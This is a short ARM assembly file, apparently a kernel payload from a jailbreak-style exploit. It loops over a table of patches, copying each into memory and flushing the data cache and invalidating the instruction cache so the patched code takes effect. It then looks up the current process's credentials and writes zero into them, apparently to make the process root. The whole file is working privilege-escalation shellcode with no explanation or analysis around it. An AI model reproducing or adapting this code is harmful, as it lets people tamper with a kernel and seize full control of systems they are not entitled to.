.syntax unified
.arm
start:
    ldr r5, count
    adr r4, stuff
pf_loop:

    ldm r4, {r0, r2}
    add r1, r4, #8
    bl _memcpy
    ldm r4, {r0, r1}
    mov r2, #0
    bl _flush_dcache
    ldm r4!, {r0, r1}
    add r4, r1
    mov r2, #0
    bl _invalidate_icache
    
    subs r5, #1
    bne pf_loop
    bl _current_proc
    bl _proc_ucred
    str r5, [r0, #0xc]
    ldm sp, {r4, r7, pc}^

count: .long 0
stuff:
